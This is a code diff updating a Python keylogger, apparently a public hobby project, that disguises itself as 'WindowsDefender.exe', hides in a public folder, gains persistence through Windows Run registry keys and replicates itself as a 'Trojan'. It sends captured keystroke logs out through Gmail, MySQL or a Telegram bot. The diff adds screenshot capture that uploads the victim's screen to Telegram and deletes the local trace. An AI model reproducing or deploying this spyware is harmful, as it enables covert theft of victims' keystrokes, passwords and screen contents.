@@ -10,7 +10,7 @@
 # █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
 # ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
 # ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
-# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v5.2
+# ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  v5.3 by SebastianEPH |https://github.com/SebastianEPH|
 
 #region import Libs
 from eventlet.tpool import socket, threading  # Librería verifica internet y permite procesos multihilos
@@ -27,22 +27,23 @@ import pymysql                  # Lib connection mysql
 import shutil                   # Lib para crear carpetas
 import string                   # Lib genera textos
 import time                     # Contar segundos
-
+from PIL import ImageGrab       # Toma capturas de pantalla
 #endregion
 
 #region Code Main
 class Config:
     def __init__(self):
         self.NAME_KEY = "WindowsDefender"+ ".exe"   # Nombre del Keylogger // Debe ser exactamente igual al Compilado *.exe
-        self.NAME_STARTUP = "Windows Defeder REG"                                   # Nombre del Keylogger en el registro
-        self.PATH_OCULT = "C:\\Users\\Public\\Security\\Windows Defender" + "\\"    # Ruta donde se esconderá el KEYLOGGER
-        self.LOG_KEY_PATH = "C:\\Users\\Public\\Security\\Settings"+ "\\"           # Ruta del Registro de teclas
+        self.NAME_REG = "Windows Defeder REG"                                   # Nombre del Keylogger en el registro
+        self.PATH_HIDDEN_LOG = "C:\\Users\\Public\\Security\\Settings" + "\\"           # Ruta del Registro de teclas
         self.LOG_NAME = "reg" + "." + "k"
-        self.PATH_KEY = self.PATH_OCULT + self.NAME_KEY         # <No cambiar>
-        self.PATH_LOG = self.LOG_KEY_PATH + self.LOG_NAME       # <No cambiar>
-        # Importante
-        self.TIMESEND = 1 #[minutos]                                               # Tiempo de envió del registro
-        self.MODE = 2      # 0 = Gmail
+        self.PATH_HIDDEN_KEY = "C:\\Users\\Public\\Security\\Windows Defender" + "\\"  # Ruta donde se esconderá el KEYLOGGER
+        self.PATH_KEY = self.PATH_HIDDEN_KEY + self.NAME_KEY         # <No cambiar>
+        self.PATH_LOG = self.PATH_HIDDEN_LOG + self.LOG_NAME       # <No cambiar>
+        self.SCREENSHOT = True                                  # Activar o desactivar Screenshot
+        self.TIME_SCREENSHOT = 1                                # Tiempo de intervalo de ScreenShot
+        self.TIME_SEND = 1 #[minutos]                                               # Tiempo de envió del registro
+        self.MODE_SEND = 2      # 0 = Gmail
                            # 1 = DataBase                                           # Solo se puede usar una opción
                            # 2 = TelegramBot
     class DataBase:  # Clase de Base de datos
@@ -85,6 +86,8 @@ class Functions:
 
     def RandomChar(self,y=50): # Genera letras aleatorias [Longitud según el argumento]
         return ''.join(random.choice(string.ascii_letters) for x in range(y))
+    def RamdomLogNamePATH(self):
+        return Config().PATH_HIDDEN_LOG + Functions().RandomChar(23) + ".txt"
 
     # Función = Verifica si hay conexión a internet para poder envíar el log
     def VerifyConnection(self):
@@ -118,9 +121,6 @@ class Functions:
             print("[SendGmail] ["+email+"] No se pudo envíar el Registro de teclas")
             return False
 
-    def RamdomLogNamePATH(self):
-        return Config().LOG_KEY_PATH + Functions().RandomChar(23) + ".txt"
-
     def CurrentTime(self):
         T = datetime.datetime.now()
         return T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + " " + T.strftime("%I") + ":" + T.strftime("%M") + " " + T.strftime("%p")
@@ -148,12 +148,12 @@ class Util:
 
     def CreateFolders(self):    # Crea el directorio oculto
         try:  # Intenta crear la dirección
-            os.makedirs(Config().PATH_OCULT)
-            print("[CreateFolders] - Exito al crear la ruta: " + Config().PATH_OCULT)
+            os.makedirs(Config().PATH_HIDDEN_KEY)
+            print("[CreateFolders] - Exito al crear la ruta: " + Config().PATH_HIDDEN_KEY)
         except:
-            print("[CreateFolders] - La carpeta ya existe: "+ Config().PATH_OCULT)
+            print("[CreateFolders] - La carpeta ya existe: " + Config().PATH_HIDDEN_KEY)
         try:  # Intenta crear la dirección del registro de teclas..
-            os.makedirs(Config().LOG_KEY_PATH)
+            os.makedirs(Config().PATH_HIDDEN_LOG)
             print("[CreateFolders] - Exito al crear la ruta: " + Config().PATH_KEY)
         except:
             print("[CreateFolders] - La carpeta ya existe: " + Config().PATH_KEY)
@@ -162,7 +162,7 @@ class Util:
         try:
             self.CreateFolders()  # Crea el directorios [Evita posibles errores]
             # Copia el archivo
-            path = Config().LOG_KEY_PATH+ name
+            path = Config().PATH_HIDDEN_LOG + name
             os.rename(Config().PATH_LOG, path)
             print("El archivo reg.k se renombró correctamente")
         except:
@@ -174,7 +174,7 @@ class Util:
         keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
         try:    # Solo si tiene permisos de administrador
             registry = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS)  # machine
-            SetValueEx(registry, Config().NAME_STARTUP, 0, REG_SZ, Config().PATH_KEY)
+            SetValueEx(registry, Config().NAME_REG, 0, REG_SZ, Config().PATH_KEY)
             Functions().CheckFolder_StartUP() # Crea carpeta
             print("[StartUp] Exitoso Administrador")
         except:
@@ -182,7 +182,7 @@ class Util:
             if Functions().CheckFolder_StartUP():
                 print("[StartUp] USER - No se encontró, creando...")
                 registry = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)  # local
-                SetValueEx(registry, Config().NAME_STARTUP, 0, REG_SZ, Config().PATH_KEY)
+                SetValueEx(registry, Config().NAME_REG, 0, REG_SZ, Config().PATH_KEY)
                 print("[StartUp] USER - EXITOSO")
 
     def Trojan(self):   # Se Replica en el sistema
@@ -198,16 +198,7 @@ class Util:
             except:
                 print("\n[Trojan] - Hubo un problema al replicar en el sistema")
     def ScreenShot(self):
-        """        bot = telepot.Bot(Config.TelegramBot().TOKEN)
-        #bot.message_loop(handle)
-        bot.sendChatAction(Config.TelegramBot().ID, 'typing')
-        bot.sendChatAction(chat_id, 'typing')
-        screenshot = ImageGrab.grab()
-        screenshot.save('screenshot.jpg')
-        bot.sendChatAction(chat_id, 'upload_photo')
-        bot.sendDocument(chat_id, open('screenshot.jpg', 'rb'))
-        os.remove('screenshot.jpg')
-        """
+
         pass
     # Envía los datos reg.k vía Gmail
     def SendGmail(self):
@@ -218,7 +209,7 @@ class Util:
 
         # Envía el archivo renombrado
         self.CreateFolders()
-        homedir = Config().LOG_KEY_PATH + str(nameFile)
+        homedir = Config().PATH_HIDDEN_LOG + str(nameFile)
         print("[Gmail send] Proceso de envío...")
 
         if Functions().SendGmail(homedir, Config.Gmail().GMAIL_1, Config.Gmail().PASS_1, Config.Gmail().RECEIVERS):
@@ -316,16 +307,27 @@ class Send:
     def Log(self):
         print("[SendLog] Active...")
         while True:
-            print("[SendLog] El tiempo de espera es: " +str(Config().TIMESEND )+ "minutos")
-            time.sleep(Config().TIMESEND * 60)  # Tiempo de espera por minutos
+            print("[SendLog] El tiempo de espera es: " + str(Config().TIME_SEND) + "minutos")
+            time.sleep(Config().TIME_SEND * 60)  # Tiempo de espera por minutos
             #time.sleep(10) # Solo antigueeo
             if Functions().VerifyConnection():
-                if Config().MODE == 0:
+                if Config().MODE_SEND == 0:
                     Util().SendGmail()
-                if Config().MODE == 1:
+                if Config().MODE_SEND == 1:
                     Util().MySQL()
-                if Config().MODE == 2:
+                if Config().MODE_SEND == 2:
                     Util().TelegramBot()
+    def ScreenShot(self):
+        if Config().SCREENSHOT:
+            print("[ScreenShot] Active...")
+            while True:
+                print("[ScreenShot] Wait: "+str(Config().TIME_SCREENSHOT *60))
+                time.sleep(Config().TIME_SCREENSHOT * 60)
+        else:
+            print("[ScreenShot] Disable...")
+
+
+
 
 class Keylogger:
     def __init__(self):
@@ -521,7 +523,7 @@ class Keylogger:
 #endregion
 
 if __name__ == '__main__':
-
+    """
     print("[Keylogger] start...")
     print("[Keylogger] Listening to Keys...")
 
@@ -534,4 +536,21 @@ if __name__ == '__main__':
     p2.start()
     p1.start()
     p1.join()
+    """
+    PATH_SCREEN = Config().PATH_HIDDEN_LOG + str(getuser()) + " - " + Functions().CurrentTime() + ".jpg"
+    try:
+        print("[ScreenShot] Starting... ")
+        bot = telepot.Bot(Config.TelegramBot().TOKEN)
+        bot.sendChatAction(Config.TelegramBot().ID, 'typing')
+        screenshot = ImageGrab.grab()
+        print("[ScreenShot] Se tomó una captura ")
+        screenshot.save(PATH_SCREEN)
+        print("[ScreenShot] Se guardó correctamente la captura")
+        bot.sendChatAction(Config.TelegramBot().ID, 'upload_photo')
+        bot.sendDocument(Config.TelegramBot().ID, open(PATH_SCREEN, 'rb'))
+        print("[ScreenShot] Se envió correctamente")
+        os.remove(PATH_SCREEN)
+        print("[ScreenShot] Se eliminó caché")
+    except:
+        print("[ScreenShot] Hubo un error en el proceso.")
 
